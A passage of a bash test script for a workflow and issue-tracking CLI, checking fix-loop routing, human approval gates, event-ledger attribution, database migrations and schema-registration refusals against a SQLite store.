  ZG_L_ACT=$(sqlite3 "$ZG_L/issues.db" \
    "SELECT COUNT(*) FROM artifacts a JOIN steps s ON s.id = a.step_id
      WHERE s.instance = 'reconcile@0' AND a.kind = 'findings';")
  check_cond "ZG" "ZG20_action_artifact_kind" "reconcile@0 artifact kind is '$ZG_L_ACT', want params.output = findings" [ "$ZG_L_ACT" -ge 1 ]

  # THE STUB IS RETIRED (§6.3 S1-S4). A real action artifact records its payload
  # as the PLAIN ARRAY and leaves `artifacts.stub` at 0; the wrapper survives
  # only on rows an S3/S4 binary wrote, whose bytes the migration deliberately
  # does not rewrite. What replaced the marker is an `action_results` row.
  local ZG_L_STUB
  ZG_L_STUB=$(sqlite3 "$ZG_L/issues.db" \
    "SELECT COUNT(*) FROM artifacts a JOIN steps s ON s.id = a.step_id
      WHERE s.instance = 'reconcile@0'
        AND (a.stub = 1 OR a.payload LIKE '%\"stub\":true%');")
  check_cond "ZG" "ZG20_no_stub_marker" "$ZG_L_STUB reconcile@0 artifacts still carry the retired stub marker" [ "$ZG_L_STUB" = "0" ]

  local ZG_L_AR
  ZG_L_AR=$(sqlite3 "$ZG_L/issues.db" \
    "SELECT COUNT(*) FROM action_results r JOIN steps s ON s.id = r.step_id
      WHERE s.instance = 'reconcile@0' AND r.builtin = 1 AND r.verdict = 'pass'
        AND r.argv IS NULL AND r.exit IS NULL;")
  if [ "$ZG_L_AR" = "1" ]; then
    check "ZG" "ZG20_action_result_recorded" "PASS"
  else
    check "ZG" "ZG20_action_result_recorded" "FAIL" \
      "$ZG_L_AR builtin action_results rows for reconcile@0, want exactly 1 " \
      "with NULL argv/exit — a builtin spawns nothing"
  fi

  # Step 4: reconcile@0 routed `pass` — the T4 SHORT-CIRCUIT, asserted directly
  # so a future change to T4 breaks THIS check rather than making the loop
  # mysteriously stop looping somewhere downstream.
  local ZG_L_RECROUTE
  ZG_L_RECROUTE=$(sqlite3 "$ZG_L/issues.db" \
    "SELECT routing FROM steps WHERE instance='reconcile@0';")
  check_cond "ZG" "ZG20_reconcile_t4_pass" "reconcile@0 routed '$ZG_L_RECROUTE', want pass — T4 short-circuits \`any\` over an empty payload" [ "$ZG_L_RECROUTE" = "pass" ]

  # Step 5: verify@0 with a crafted `unmet` payload => `any(status == unmet)` is
  # true by T1 => routing `fix-loop`.
  zg_complete_step "$ZG_L" "verify@0" "$ZG_TMP/artifact.txt" "$ZG_TMP/unmet.json"
  local ZG_L_VROUTE
  ZG_L_VROUTE=$(sqlite3 "$ZG_L/issues.db" \
    "SELECT routing FROM steps WHERE instance='verify@0';")
  check_cond "ZG" "ZG20_verify_routes_fix_loop" "verify@0 routed '$ZG_L_VROUTE', want fix-loop on an unmet payload" [ "$ZG_L_VROUTE" = "fix-loop" ]

  # Step 6: LOOP ENTRY. The counter, the event, the supersede sweep, and the
  # loop body's instantiation.
  local ZG_L_COUNT
  ZG_L_COUNT=$(sqlite3 "$ZG_L/issues.db" \
    "SELECT loop_count FROM run_issues WHERE run_id=1 AND issue_id=1;")
  check_cond "ZG" "ZG20_loop_count" "loop_count = $ZG_L_COUNT after one entry, want 1" [ "$ZG_L_COUNT" = "1" ]

  local ZG_L_EV
  ZG_L_EV=$(sqlite3 "$ZG_L/issues.db" \
    "SELECT COUNT(*) FROM events WHERE kind='loop-entered';")
  check_cond "ZG" "ZG20_loop_entered_event" "$ZG_L_EV loop-entered events, want 1" [ "$ZG_L_EV" = "1" ]

  # commit-gate@0 and commit@0 are downstream of `after_loop` and unclaimed:
  # superseded (§7.3), each event-logged.
  local ZG_L_SUP
  ZG_L_SUP=$(sqlite3 "$ZG_L/issues.db" \
    "SELECT GROUP_CONCAT(instance, ',') FROM (
       SELECT instance FROM steps WHERE status='superseded' ORDER BY instance);")
  if [ "$ZG_L_SUP" = "commit-gate@0,commit@0" ] || [ "$ZG_L_SUP" = "commit@0,commit-gate@0" ]; then
    check "ZG" "ZG20_superseded_rows" "PASS"
  else
    check "ZG" "ZG20_superseded_rows" "FAIL" \
      "superseded set is '$ZG_L_SUP', want commit-gate@0 and commit@0"
  fi

  local ZG_L_SUPEV
  ZG_L_SUPEV=$(sqlite3 "$ZG_L/issues.db" \
    "SELECT COUNT(*) FROM events WHERE kind='step-superseded';")
  check_cond "ZG" "ZG20_superseded_events" "$ZG_L_SUPEV step-superseded events, want 2" [ "$ZG_L_SUPEV" = "2" ]

  # `implement@0` is UPSTREAM of after_loop: untouched, still done, and still
  # addressable — prior instances are immutable (§11.3).
  local ZG_L_IMP
  ZG_L_IMP=$(sqlite3 "$ZG_L/issues.db" "SELECT status FROM steps WHERE instance='implement@0';")
  check_cond "ZG" "ZG20_upstream_untouched" "implement@0 = '$ZG_L_IMP'; it is upstream of after_loop and must not be swept" [ "$ZG_L_IMP" = "done" ]

  # fix@1 instantiated (§11.3 (3)), and the after_loop chain with it (§11.3 (4)).
  local ZG_L_ORD1
  ZG_L_ORD1=$(sqlite3 "$ZG_L/issues.db" \
    "SELECT COUNT(*) FROM steps WHERE ordinal=1 AND instance IN
       ('fix@1','review@1#0','review@1#1','review@1#2','review@1#3',
        'synthesize@1','reconcile@1','verify@1','commit-gate@1','commit@1');")
  check_cond "ZG" "ZG20_ordinal_1_instances" "$ZG_L_ORD1 of 10 ordinal-1 instances exist" [ "$ZG_L_ORD1" = "10" ]

  # implement@1 must NOT exist: it is upstream of after_loop.
  local ZG_L_IMP1
  ZG_L_IMP1=$(sqlite3 "$ZG_L/issues.db" "SELECT COUNT(*) FROM steps WHERE instance='implement@1';")
  check_cond "ZG" "ZG20_no_upstream_reinstantiation" "implement@1 exists; upstream steps do not re-instantiate" [ "$ZG_L_IMP1" = "0" ]

  # Step 7: fix@1's inputs bind PER INPUT across ordinals (§7.4) —
  # `reconcile.findings` at ordinal 0 (nothing has re-run it at ordinal 1) and
  # `implement.change-summary` at ordinal 0. Asserted by PRODUCER INSTANCE,
  # which is the artifact's identity on the wire.
  run_env "$ZG_L" step context "$(zg_step_id "$ZG_L" 'fix@1')" --json
  assert_exit "ZG" "ZG20_fix_context" 0
  local ZG_L_PRODUCERS
  ZG_L_PRODUCERS=$(printf '%s' "$CMD_STDOUT" |
    jq -r '[.data.context.inputs[].producer_step] | sort | unique | join(",")')
  if printf '%s' "$ZG_L_PRODUCERS" | grep -q 'reconcile@0' &&
     printf '%s' "$ZG_L_PRODUCERS" | grep -q 'implement@0'; then
    check "ZG" "ZG20_per_input_fallback" "PASS"
  else
    check "ZG" "ZG20_per_input_fallback" "FAIL" \
      "fix@1 bound producers '$ZG_L_PRODUCERS', want reconcile@0 and implement@0"
  fi

  # Step 8: complete fix@1 and run the second pass to verify@1.
  zg_complete_step "$ZG_L" "fix@1" "$ZG_TMP/artifact.txt" ""
  zg_complete_step "$ZG_L" "review@1#0" "$ZG_TMP/artifact.txt" ""
  zg_complete_step "$ZG_L" "review@1#1" "$ZG_TMP/artifact.txt" ""
  zg_complete_step "$ZG_L" "review@1#2" "$ZG_TMP/artifact.txt" ""
  zg_complete_step "$ZG_L" "review@1#3" "$ZG_TMP/artifact.txt" ""
  zg_complete_step "$ZG_L" "synthesize@1" "$ZG_TMP/artifact.txt" ""
  run_env "$ZG_L" next --run RUN-1 --json >/dev/null
  assert_exit "ZG" "ZG20_second_pass" 0

  # Step 9: verify@1 with a `met` payload => no threshold matches => `pass` =>
  # commit-gate@1 becomes ready. The THRESHOLD RE-APPLIED at the new ordinal
  # and reached a different verdict, which is what re-running it is for.
  zg_complete_step "$ZG_L" "verify@1" "$ZG_TMP/artifact.txt" "$ZG_TMP/met.json"
  local ZG_L_V1
  ZG_L_V1=$(sqlite3 "$ZG_L/issues.db" "SELECT routing FROM steps WHERE instance='verify@1';")
  check_cond "ZG" "ZG20_verify1_passes" "verify@1 routed '$ZG_L_V1' on a met payload, want pass" [ "$ZG_L_V1" = "pass" ]

  # Step 10: commit-gate@1 is `type="human"` — `claim` refuses it (§6.15), and
  # `step approve` moves it to done.
  local ZG_L_GATE
  ZG_L_GATE=$(zg_step_id "$ZG_L" 'commit-gate@1')
  run_env "$ZG_L" step claim "$ZG_L_GATE" --owner zg-loop --json
  assert_exit_nonzero "ZG" "ZG20_human_claim_refused"

  # `guard gate` DENIES before the approve...
  run_env "$ZG_L" guard gate --step commit-gate
  assert_exit "ZG" "ZG20_guard_gate_denies" 2

  run_env "$ZG_L" step approve "$ZG_L_GATE" --json
  assert_exit "ZG" "ZG20_approve" 0

  # ...and ALLOWS after it.
  run_env "$ZG_L" guard gate --step commit-gate
  assert_exit "ZG" "ZG20_guard_gate_allows" 0

  # Step 11: commit@1 completes; the run reaches `done`. Completion is
  # evaluated over HIGHEST-ORDINAL instances only, so the superseded ordinal-0
  # commit-gate/commit do not block it, and the `done` verify@0 alongside the
  # `done` verify@1 does not double-count.
  zg_complete_step "$ZG_L" "commit@1" "$ZG_TMP/artifact.txt" ""

  local ZG_L_RUN ZG_L_ISSUE
  ZG_L_RUN=$(sqlite3 "$ZG_L/issues.db" "SELECT status FROM runs WHERE id=1;")
  ZG_L_ISSUE=$(sqlite3 "$ZG_L/issues.db" "SELECT status FROM issues WHERE id=1;")
  if [ "$ZG_L_RUN" = "done" ] && [ "$ZG_L_ISSUE" = "done" ]; then
    check "ZG" "ZG20_highest_ordinal_completion" "PASS"
  else
    check "ZG" "ZG20_highest_ordinal_completion" "FAIL" \
      "run=$ZG_L_RUN issue=$ZG_L_ISSUE after ordinal 1 finished; want both done"
  fi

  # The superseded ordinal-0 rows are STILL superseded — completion did not
  # rewrite them. Prior instances remain immutable and addressable (§11.3).
  local ZG_L_SUP_AFTER
  ZG_L_SUP_AFTER=$(sqlite3 "$ZG_L/issues.db" \
    "SELECT COUNT(*) FROM steps WHERE status='superseded';")
  check_cond "ZG" "ZG20_superseded_immutable" "$ZG_L_SUP_AFTER superseded rows at completion, want the original 2" [ "$ZG_L_SUP_AFTER" = "2" ]

  # loop_count never exceeded max_fix_loops = 2.
  local ZG_L_FINAL
  ZG_L_FINAL=$(sqlite3 "$ZG_L/issues.db" \
    "SELECT loop_count FROM run_issues WHERE run_id=1 AND issue_id=1;")
  check_cond "ZG" "ZG20_loop_bound_respected" "loop_count = $ZG_L_FINAL, over max_fix_loops = 2" [ "$ZG_L_FINAL" -le 2 ]

  # `guard stop` allows on the finished run.
  run_env "$ZG_L" guard stop
  assert_exit "ZG" "ZG20_guard_stop_allows" 0

  # ---------------------------------------------------------------------------
  # ZG21: §9 ITEM 2, PARTIAL (§6.16, §7.7).
  #
  # "Every transition is attributable to `next`, a gate, a threshold, or human
  # input." Over ZG20's completed run: every event kind is drawn from §7.6's
  # CLOSED SET, and every step status change has a producing event.
  #
  # STILL PARTIAL, but for ONE remaining reason rather than two:
  #   1. Gates are REAL as of stage 4 — ZG13 above trusts them and proves a
  #      subprocess ran, and the closed set gained `gate-unmatched`/`gate-rerun`
  #      and `trust-added`/`trust-removed` (gates-trust §6.4). This run's gates
  #      are unmatched (it trusts nothing), which is itself an attributable
  #      transition and is why `gate-unmatched` appears below.
  #   2. ORDERED THRESHOLDS ARE INERT at S3 (§6.14 T3/T4). The `>=` half of
  #      "attributable to a threshold" is never exercised by this run, because
  #      the only ordered threshold short-circuits to false on an empty payload.
  # S5 closes that half; this asserts everything that exists now.
  # ---------------------------------------------------------------------------

  local ZG_L_KINDS ZG_L_UNKNOWN
  ZG_L_KINDS=$(sqlite3 "$ZG_L/issues.db" "SELECT DISTINCT kind FROM events ORDER BY kind;")
  ZG_L_UNKNOWN=$(printf '%s\n' "$ZG_L_KINDS" | grep -vxE \
    'run-started|run-activated|run-paused|run-resumed|run-abandoned|run-done|step-ready|step-claimed|step-heartbeat|step-recorded|gate-started|gate-recorded|step-routed|step-failed|step-superseded|step-skipped|step-resolved|step-approved|step-rejected|loop-entered|join-completed|lease-reaped|issue-promoted|issue-abandoned|issue-in-progress|issue-review|gate-unmatched|gate-rerun|trust-added|trust-removed|vote-opened|vote-tallied|project-registered' || true)
  if [ -z "$ZG_L_UNKNOWN" ]; then
    check "ZG" "ZG21_kinds_are_closed" "PASS"
  else
    check "ZG" "ZG21_kinds_are_closed" "FAIL" \
      "event kinds outside §7.6's closed set: $(printf '%s' "$ZG_L_UNKNOWN" | tr '\n' ' ')"
  fi

  # Every terminal step has a producing event. A step that reached `done`,
  # `superseded`, or a routed end without one is an unattributable transition.
  local ZG_L_UNATTRIB
  ZG_L_UNATTRIB=$(sqlite3 "$ZG_L/issues.db" \
    "SELECT COUNT(*) FROM steps s
      WHERE s.status IN ('done','superseded','skipped','failed-routed')
        AND NOT EXISTS (SELECT 1 FROM events e WHERE e.step_id = s.id);")
  check_cond "ZG" "ZG21_every_transition_attributed" "$ZG_L_UNATTRIB terminal steps have no producing event" [ "$ZG_L_UNATTRIB" = "0" ]

  # The run's own lifecycle is in the ledger, and `seq` is strictly increasing.
  local ZG_L_SEQ
  ZG_L_SEQ=$(sqlite3 "$ZG_L/issues.db" \
    "SELECT COUNT(*) FROM events a JOIN events b ON b.seq = a.seq AND b.rowid != a.rowid;")
  check_cond "ZG" "ZG21_seq_unique" "$ZG_L_SEQ duplicate seq values" [ "$ZG_L_SEQ" = "0" ]

  local ZG_L_RUNEV
  ZG_L_RUNEV=$(sqlite3 "$ZG_L/issues.db" \
    "SELECT COUNT(*) FROM events WHERE kind IN ('run-activated','run-done');")
  check_cond "ZG" "ZG21_run_lifecycle_logged" "the run's activation and completion are not both in the ledger" [ "$ZG_L_RUNEV" -ge 2 ]

  # ---------------------------------------------------------------------------
  # ZG22: §6.14 T3 — the engine REFUSES TO GUESS AN ORDER.
  #
  # The committed fixture cannot reach T3: its only ordered threshold sits on
  # `reconcile`, whose stub payload is empty and short-circuits at T4. So a
  # throwaway workflow supplies the case the fixture cannot — an ordered
  # comparison over a NON-EMPTY payload, with no registered schema to declare
  # the order (schemas are S5's).
  #
  # The step must PARK `waiting-human` with a reason naming the predicate and
  # the missing schema. That is the difference between an engine that refuses to
  # guess and one that never has to.
  # ---------------------------------------------------------------------------

  local ZG_T3
  ZG_T3=$(qa_mktemp_d)
  cat >"$ZG_T3/ordered.toml" <<'ZGT3EOF'
[pipeline]
name = "ordered-threshold"
version = 1

[match]
kind = ["task"]

[[step]]
name = "measure"
after = []
executor = "measure"
emits = "findings"
threshold = { "fix-loop" = "any(x >= y)" }

# The loop body V17b requires (DKT-196). It is incidental to T3 — what this
# case is about is an ordered comparison with no schema to declare the order —
# but a `fix-loop` routing with nothing to enter is a shape register refuses,
# and a fixture carrying it would fail at registration for a reason that has
# nothing to do with the subject.
[[step]]
name       = "repair"
executor   = "repair"
emits      = "fix-summary"
loop       = true
after_loop = "measure"
ZGT3EOF

  run_env "$ZG_T3" init >/dev/null
  run_env "$ZG_T3" workflow register "$ZG_T3/ordered.toml" --json
  assert_exit "ZG" "ZG22_register" 0
  run_env "$ZG_T3" issue create -t "ZG22 ordered" -d "body" --json >/dev/null
  run_env "$ZG_T3" run start --issue DKT-1 --json >/dev/null
  run_env "$ZG_T3" run activate RUN-1 --json >/dev/null

  printf '[{"x":"high","y":"low"}]\n' >"$ZG_TMP/ordered.json"
  zg_complete_step "$ZG_T3" "measure@0" "$ZG_TMP/artifact.txt" "$ZG_TMP/ordered.json"

  local ZG_T3_STATUS ZG_T3_ROUTING
  ZG_T3_STATUS=$(sqlite3 "$ZG_T3/issues.db" "SELECT status FROM steps WHERE instance='measure@0';")
  ZG_T3_ROUTING=$(sqlite3 "$ZG_T3/issues.db" "SELECT routing FROM steps WHERE instance='measure@0';")
  check_cond "ZG" "ZG22_t3_parks" "measure@0 = '$ZG_T3_STATUS' on an ordered comparison with no schema, want waiting-human" [ "$ZG_T3_STATUS" = "waiting-human" ]
  if printf '%s' "$ZG_T3_ROUTING" | grep -q 'schema'; then
    check "ZG" "ZG22_t3_reason" "PASS"
  else
    check "ZG" "ZG22_t3_reason" "FAIL" \
      "routing '$ZG_T3_ROUTING' does not name the missing schema"
  fi

  # ---------------------------------------------------------------------------
  # ZG23: PHASE-4 DORMANCY (§3).
  #
  # "Loops/joins/events add no output to any existing verb; the events table is
  # written but has no read verb, so it cannot change any output."
  #
  # The subject is ZG20's LOOPED, COMPLETED run — a database with events,
  # superseded rows, and two ordinals in it. That is the sharpest available
  # subject: if a looped run cannot change an existing verb's output, no run can.
  # ---------------------------------------------------------------------------

  # The events table is populated — otherwise everything below is vacuous.
  local ZG_D4_EVENTS
  ZG_D4_EVENTS=$(sqlite3 "$ZG_L/issues.db" "SELECT COUNT(*) FROM events;")
  check_cond "ZG" "ZG23_events_written" "no events after a full looped run; the dormancy checks below prove nothing" [ "$ZG_D4_EVENTS" -gt 0 ]

  # THE READ VERB LANDED AT S6 (runs-dispatch §8), so this assertion INVERTED.
  #
  # At S3 it read "`events` is not a verb": the events table was written but had
  # no reader, which is what made phase 4's dormancy trivially true. §10 puts the
  # read surface at stage 6, and it is here — so the check now asserts the verb
  # EXISTS and reads the very run this section built, while the dormancy claim
  # below is carried by the byte-identity checks rather than by the reader's
  # absence.
  #
  # The dormancy that survives is D4's, and it is the stronger statement:
  # `events list` is a NEW VERB, and reading a table cannot change another verb's
  # output. The byte-comparisons further down assert exactly that.
  run_env "$ZG_L" events list --json
  assert_exit "ZG" "ZG23_events_verb_reads" 0

  local ZG_D4_LISTED
  ZG_D4_LISTED=$(printf '%s' "$CMD_STDOUT" | jq -r '.data.total')
  check_cond "ZG" "ZG23_events_verb_total_matches_table" "the feed reports $ZG_D4_LISTED events and the table holds $ZG_D4_EVENTS" [ "$ZG_D4_LISTED" = "$ZG_D4_EVENTS" ]

  run_env "$ZG_L" --help
  if printf '%s' "$CMD_STDOUT" | grep -qE '^\s+events'; then
    check "ZG" "ZG23_events_in_help" "PASS"
  else
    check "ZG" "ZG23_events_in_help" "FAIL" \
      "the events verb is registered but absent from help; §10 lands the read surface at stage 6"
  fi

  # A workflow-free repo is untouched by this phase: its output is byte-
  # identical across a build that writes events, and its events table carries
  # nothing this phase would have written.
  #
  # It is NOT empty: tenancy (DKT-61) writes exactly one `project-registered`
  # event on first contact, in every repo, workflow or none — that event is
  # orthogonal to phase 4 and predates it existing at all. The dormancy claim
  # under test is narrower and still holds: no RUN exists, so no run-scoped
  # event kind can appear.
  local ZG_D4
  ZG_D4=$(qa_mktemp_d)
  run_env "$ZG_D4" init >/dev/null
  run_env "$ZG_D4" issue create -t "ZG23 dormant" -d "body" --json >/dev/null
  run_env "$ZG_D4" issue move DKT-1 todo --json >/dev/null

  local ZG_D4_ROWS
  ZG_D4_ROWS=$(sqlite3 "$ZG_D4/issues.db" \
    "SELECT COUNT(*) FROM events WHERE kind != 'project-registered';")
  check_cond "ZG" "ZG23_workflow_free_no_events" \
    "$ZG_D4_ROWS non-tenancy events in a repo that never registered a workflow" \
    [ "$ZG_D4_ROWS" = "0" ]

  # Existing verbs over the LOOPED run: `issue show` at v1 and in human mode
  # carries no loop, ordinal, or event vocabulary. `next` (issue mode) likewise.
  local ZG_D4_SHOW ZG_D4_HUMAN ZG_D4_NEXT
  run_env "$ZG_L" issue show DKT-1 --json;  ZG_D4_SHOW="$CMD_STDOUT"
  run_env "$ZG_L" issue show DKT-1;         ZG_D4_HUMAN="$CMD_STDOUT"
  run_env "$ZG_L" next --json;              ZG_D4_NEXT="$CMD_STDOUT"

  local ZG_D4_LEAK=""
  for ZG_D4_WORD in loop_count loop-entered superseded ordinal events seq; do
    printf '%s' "$ZG_D4_SHOW"  | grep -q "$ZG_D4_WORD" && ZG_D4_LEAK="$ZG_D4_LEAK show-v1:$ZG_D4_WORD"
    printf '%s' "$ZG_D4_HUMAN" | grep -q "$ZG_D4_WORD" && ZG_D4_LEAK="$ZG_D4_LEAK show-human:$ZG_D4_WORD"
    printf '%s' "$ZG_D4_NEXT"  | grep -q "$ZG_D4_WORD" && ZG_D4_LEAK="$ZG_D4_LEAK next:$ZG_D4_WORD"
  done
  check_cond "ZG" "ZG23_no_loop_vocabulary_leaks" "phase-4 vocabulary reached an existing verb:$ZG_D4_LEAK" [ -z "$ZG_D4_LEAK" ]

  # The §9 item 8 fixture protocol, again at phase 4: 4 -> 7 in ONE pass, with
  # the PHASE-4 structures asserted present before the golden diff is trusted.
  local ZG_FX4
  ZG_FX4=$(qa_mktemp_d)
  cp "$SCRIPT_DIR/qa/fixtures/v4-baseline.db" "$ZG_FX4/issues.db"

  local FX4_LIST_BEFORE FX4_SHOW_BEFORE
  run_env "$ZG_FX4" issue list --all --json; FX4_LIST_BEFORE="$CMD_STDOUT"
  run_env "$ZG_FX4" issue show DKT-1 --json; FX4_SHOW_BEFORE="$CMD_STDOUT"
  if [ -n "$FX4_LIST_BEFORE" ] && [ -n "$FX4_SHOW_BEFORE" ]; then
    check "ZG" "ZG23_fixture_nonempty" "PASS"
  else
    check "ZG" "ZG23_fixture_nonempty" "FAIL" "fixture reads were empty"
  fi

  run_env "$ZG_FX4" config --json
  assert_json "ZG" "ZG23_migrated" ".data.schema_version" "$CURRENT_SCHEMA_VERSION"

  local FX4_EVT FX4_IDX FX4_COL
  FX4_EVT=$(sqlite3 "$ZG_FX4/issues.db" \
    "SELECT COUNT(*) FROM sqlite_master WHERE type='table' AND name='events';")
  FX4_IDX=$(sqlite3 "$ZG_FX4/issues.db" \
    "SELECT COUNT(*) FROM sqlite_master WHERE type='index' AND name='idx_events_run_seq';")
  FX4_COL=$(sqlite3 "$ZG_FX4/issues.db" \
    "SELECT COUNT(*) FROM pragma_table_info('run_issues') WHERE name='loop_count';")
  if [ "$FX4_EVT" = "1" ] && [ "$FX4_IDX" = "1" ] && [ "$FX4_COL" = "1" ]; then
    check "ZG" "ZG23_phase4_structures" "PASS"
  else
    check "ZG" "ZG23_phase4_structures" "FAIL" \
      "after 4->7: events=$FX4_EVT index=$FX4_IDX loop_count=$FX4_COL, want 1/1/1"
  fi

  local FX4_LIST_AFTER FX4_SHOW_AFTER
  run_env "$ZG_FX4" issue list --all --json; FX4_LIST_AFTER="$CMD_STDOUT"
  run_env "$ZG_FX4" issue show DKT-1 --json; FX4_SHOW_AFTER="$CMD_STDOUT"
  if [ "$FX4_LIST_BEFORE" = "$FX4_LIST_AFTER" ] && [ "$FX4_SHOW_BEFORE" = "$FX4_SHOW_AFTER" ]; then
    check "ZG" "ZG23_golden_identical" "PASS"
  else
    check "ZG" "ZG23_golden_identical" "FAIL" \
      "a v4 repo's output changed across the 4->7 migration"
  fi

  # And the migrated v4 repo has an EMPTY events table: a repo that never ran a
  # workflow has no transitions to record.
  local FX4_ROWS
  FX4_ROWS=$(sqlite3 "$ZG_FX4/issues.db" "SELECT COUNT(*) FROM events;")
  check_cond "ZG" "ZG23_migrated_events_empty" "$FX4_ROWS events in a migrated v4 repo" [ "$FX4_ROWS" = "0" ]


  # ---------------------------------------------------------------------------
  # ZG24: `docket schema register|list|show` — the §4.5 refusal matrix.
  #
  # Every row is asserted by EXIT CODE and by `.code`, because a harness reads
  # one and a human reads the other, and each is followed by a registry-unchanged
  # assertion: a refusal writes nothing.
  # ---------------------------------------------------------------------------

  local ZG_SC
  ZG_SC=$(qa_mktemp_d)
  run_env "$ZG_SC" init >/dev/null

  # A fresh repo holds EXACTLY ONE schema — the builtin (§3). Claiming zero
  # would have been the flattering statement rather than the true one.
  local SC_SEEDED
  SC_SEEDED=$(sqlite3 "$ZG_SC/issues.db" "SELECT COUNT(*) FROM schemas;")
  check_cond "ZG" "ZG24_one_builtin_row" "a fresh repo holds $SC_SEEDED schemas, want exactly the builtin" [ "$SC_SEEDED" = "1" ]

  run_env "$ZG_SC" schema list --json
  assert_exit "ZG" "ZG24_list" 0
  assert_json "ZG" "ZG24_list_builtin_ref" '.data.schemas[0].name' "aggregate"
  assert_json "ZG" "ZG24_list_builtin_marked" '.data.schemas[0].builtin' "true"
  assert_json "ZG" "ZG24_list_total" ".data.total" "1"

  # A real instance schema. It lives in scripts/qa/fixtures/, which the
  # genericity gate does not scan, because it is INSTANCE DATA BY LOCATION
  # (§1.1.1) — the cheapest possible enforcement.
  local SC_FILE="$SCRIPT_DIR/qa/fixtures/schemas/findings@1.json"
  check_cond "ZG" "ZG24_fixture_exists" "missing fixture $SC_FILE" [ -f "$SC_FILE" ]

  run_env "$ZG_SC" schema register findings@1 "$SC_FILE" --json
  assert_exit "ZG" "ZG24_register" 0
  assert_json "ZG" "ZG24_register_name" '.data.name' "findings"
  assert_json "ZG" "ZG24_register_ordered" '.data.ordered_fields[0]' "severity"
  assert_json "ZG" "ZG24_register_not_builtin" '.data.builtin' "false"

  # Idempotent on identical bytes: a success that inserts nothing and does not
  # bump the CAS column.
  run_env "$ZG_SC" schema register findings@1 "$SC_FILE" --json
  assert_exit "ZG" "ZG24_reregister_identical" 0
  local SC_ROWV
  SC_ROWV=$(sqlite3 "$ZG_SC/issues.db" \
    "SELECT row_version FROM schemas WHERE name='findings';")
  check_cond "ZG" "ZG24_reregister_no_bump" "row_version = $SC_ROWV after an idempotent re-register" [ "$SC_ROWV" = "1" ]

  # The derived index is a CACHE of a pure function of the registered bytes
  # (I2): what `ordered_fields` reports comes from `schemas.ordered`, and it
  # must describe the document `schemas.body` holds.
  local SC_ORDERED
  SC_ORDERED=$(sqlite3 "$ZG_SC/issues.db" \
    "SELECT ordered FROM schemas WHERE name='findings';")
  if printf '%s' "$SC_ORDERED" | jq -e '.severity | length == 5' >/dev/null 2>&1; then
    check "ZG" "ZG24_stored_index" "PASS"
  else
    check "ZG" "ZG24_stored_index" "FAIL" "schemas.ordered = $SC_ORDERED"
  fi
  local SC_BODY_ORDER
  SC_BODY_ORDER=$(sqlite3 "$ZG_SC/issues.db" \
    "SELECT body FROM schemas WHERE name='findings';" |
      jq -c '.items.properties.severity.enum')
  if [ "$SC_BODY_ORDER" = "$(printf '%s' "$SC_ORDERED" | jq -c '.severity')" ]; then
    check "ZG" "ZG24_index_matches_body" "PASS"
  else
    check "ZG" "ZG24_index_matches_body" "FAIL" \
      "the stored index ($SC_ORDERED) does not match the registered bytes"
  fi

  # `show --body` is the registered bytes, verbatim — what a run validates
  # against, not a re-serialization.
  run_env "$ZG_SC" schema show findings@1 --body
  assert_exit "ZG" "ZG24_show_body" 0
  check_cond "ZG" "ZG24_show_body_verbatim" "--body is not the registered bytes" [ "$CMD_STDOUT" = "$(cat "$SC_FILE")" ]

  # A Collection under v2, per the `workflow list` precedent.
  run_env "$ZG_SC" schema list --json=v2
  assert_json "ZG" "ZG24_v2_items" '.data.items | length' "2"
  assert_json "ZG" "ZG24_v2_total" ".data.total" "2"
  assert_json "ZG" "ZG24_v2_row_version" '.data.items[0].row_version' "1"
  run_env "$ZG_SC" schema list --json
  assert_json_null "ZG" "ZG24_v1_no_row_version" '.data.schemas[0].row_version'

  # --- The refusal matrix. Each row: exit code, .code, and nothing written. ---
  local SC_COUNT_BEFORE
  SC_COUNT_BEFORE=$(sqlite3 "$ZG_SC/issues.db" "SELECT COUNT(*) FROM schemas;")

  run_env "$ZG_SC" schema register findings@1 "$ZG_SC/absent.json" --json
  assert_exit "ZG" "ZG24_absent_file_exit" 2
  assert_json "ZG" "ZG24_absent_file_code" ".code" "NOT_FOUND"

  run_env "$ZG_SC" schema register findings "$SC_FILE" --json
  assert_exit "ZG" "ZG24_bad_ref_exit" 3
  assert_json "ZG" "ZG24_bad_ref_code" ".code" "VALIDATION_ERROR"

  printf '{"type": ' >"$ZG_SC/broken.json"
  run_env "$ZG_SC" schema register broken@1 "$ZG_SC/broken.json" --json
  assert_exit "ZG" "ZG24_bad_json_exit" 3
  assert_json "ZG" "ZG24_bad_json_code" ".code" "VALIDATION_ERROR"

  printf '{"type":"array","items":{"required":"severity"}}' >"$ZG_SC/nocompile.json"
  run_env "$ZG_SC" schema register broken@1 "$ZG_SC/nocompile.json" --json
  assert_exit "ZG" "ZG24_no_compile_exit" 3
  assert_json "ZG" "ZG24_no_compile_code" ".code" "VALIDATION_ERROR"

  printf '{"type":"array","items":{"type":"object","properties":{"severity":{"ordered_enum":true}}}}' \
    >"$ZG_SC/o2.json"
  run_env "$ZG_SC" schema register broken@1 "$ZG_SC/o2.json" --json
  assert_exit "ZG" "ZG24_o2_exit" 3
  assert_json "ZG" "ZG24_o2_code" ".code" "VALIDATION_ERROR"
  assert_stdout_contains "ZG" "ZG24_o2_names_path" "items.properties.severity"

  printf '{"type":"array"}' >"$ZG_SC/other.json"
  run_env "$ZG_SC" schema register findings@1 "$ZG_SC/other.json" --json
  assert_exit "ZG" "ZG24_conflict_exit" 4
  assert_json "ZG" "ZG24_conflict_code" ".code" "CONFLICT"
  local SC_REGISTERED_SHA
  SC_REGISTERED_SHA=$(sqlite3 "$ZG_SC/issues.db" \
    "SELECT source_sha256 FROM schemas WHERE name='findings';")
  assert_stdout_contains "ZG" "ZG24_conflict_names_hash" "$SC_REGISTERED_SHA"

  run_env "$ZG_SC" schema show nope@1 --json
  assert_exit "ZG" "ZG24_show_missing_exit" 2
  assert_json "ZG" "ZG24_show_missing_code" ".code" "NOT_FOUND"

  # THE VERSION-UNCHANGED ASSERTION: seven refusals wrote nothing.
  local SC_COUNT_AFTER SC_ROWV_AFTER
  SC_COUNT_AFTER=$(sqlite3 "$ZG_SC/issues.db" "SELECT COUNT(*) FROM schemas;")
  SC_ROWV_AFTER=$(sqlite3 "$ZG_SC/issues.db" "SELECT MAX(row_version) FROM schemas;")
  if [ "$SC_COUNT_AFTER" = "$SC_COUNT_BEFORE" ] && [ "$SC_ROWV_AFTER" = "1" ]; then
    check "ZG" "ZG24_refusals_wrote_nothing" "PASS"
  else
    check "ZG" "ZG24_refusals_wrote_nothing" "FAIL" \
